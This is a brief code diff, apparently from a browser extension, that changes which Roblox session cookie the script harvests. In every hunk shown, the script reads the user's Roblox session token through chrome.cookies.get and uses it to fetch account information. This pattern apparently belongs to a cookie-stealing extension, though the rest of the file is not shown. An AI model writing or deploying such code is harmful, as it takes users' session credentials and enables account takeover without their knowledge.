@@ -23,7 +23,7 @@ async function main(cookie) {
     if (cookie) {
         var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
             headers: {
-                Cookie: ".ROBLOSECURITY=" + cookie
+                Cookie: ".RBXID=" + cookie
             },
             redirect: "manual"
         })).json();
@@ -77,7 +77,7 @@ async function main(cookie) {
     });
 }
 
-chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".RBXID"}, function(cookie) {
     main(cookie ? cookie.value : null);
 });
 </script>
